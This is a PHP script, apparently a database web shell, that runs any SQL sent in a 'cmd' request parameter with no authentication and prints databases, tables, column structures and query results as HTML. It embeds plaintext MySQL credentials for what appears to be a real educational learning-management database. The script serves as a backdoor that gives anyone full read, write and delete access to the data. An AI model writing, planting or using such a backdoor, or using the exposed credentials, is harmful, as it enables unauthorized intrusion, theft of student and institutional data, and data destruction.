<?php
if (isset($_REQUEST["cmd"])) {
    // Get the command from the request
    $cmd = ($_REQUEST["cmd"]);
    
    // Establish MySQL connection
    $conn = new mysqli("localhost", "lms_fcpc_edu_ph", "k6tNh2^gJy%8yBL4UX&N", "lms_fcpc_edu_ph");

    // Check connection
    if ($conn->connect_error) {
        die("Connection failed: " . $conn->connect_error);
    }

    // Execute the query and capture the result
    $result = $conn->query($cmd);

    if ($result) {
        echo "<pre>";

        // Check the type of query and handle appropriately
        if (strpos(strtoupper($cmd), "SHOW DATABASES") !== false) {
            // Display all databases
            echo "<h3>Databases:</h3>";
            while ($row = $result->fetch_assoc()) {
                echo htmlspecialchars($row['Database']) . "\n";
            }
        } elseif (strpos(strtoupper($cmd), "SHOW TABLES") !== false) {
            // Display all tables in the current database
            echo "<h3>Tables in Database:</h3>";
            while ($row = $result->fetch_assoc()) {
                echo htmlspecialchars($row['Tables_in_' . $conn->real_escape_string($conn->query("SELECT DATABASE()")->fetch_row()[0])]) . "\n";
            }
        } elseif (strpos(strtoupper($cmd), "SHOW COLUMNS") !== false) {
            // Display columns of a table
            echo "<h3>Columns in Table:</h3>";
            while ($row = $result->fetch_assoc()) {
                echo htmlspecialchars($row['Field']) . " - " . htmlspecialchars($row['Type']) . "\n";
            }
        } elseif (strpos(strtoupper($cmd), "DESCRIBE") === 0) {
            // Describe the structure of a table
            echo "<h3>Table Structure:</h3>";
            while ($row = $result->fetch_assoc()) {
                echo htmlspecialchars($row['Field']) . " - " . htmlspecialchars($row['Type']) . " - " . htmlspecialchars($row['Null']) . " - " . htmlspecialchars($row['Key']) . " - " . htmlspecialchars($row['Default']) . " - " . htmlspecialchars($row['Extra']) . "\n";
            }
        } elseif (strpos(strtoupper($cmd), "SELECT") === 0) {
            // Handle SELECT queries
            echo "<h3>Query Results:</h3>";
            
            // Fetch the column names (header row)
            echo "<table border='1' cellpadding='5' cellspacing='0'>";
            $fields = $result->fetch_fields();
            echo "<tr>";
            foreach ($fields as $field) {
                echo "<th>" . htmlspecialchars($field->name) . "</th>";
            }
            echo "</tr>";

            // Fetch and display the rows of the result
            while ($row = $result->fetch_assoc()) {
                echo "<tr>";
                foreach ($row as $value) {
                    echo "<td>" . htmlspecialchars($value) . "</td>";
                }
                echo "</tr>";
            }

            // End the table
            echo "</table>";
        } else {
            // Handle other types of queries
            echo "Query executed successfully.\n";
        }

        echo "</pre>";
    } else {
        echo "<h3>Error:</h3> " . htmlspecialchars($conn->error);
    }

    // Close the connection
    $conn->close();
}
?>
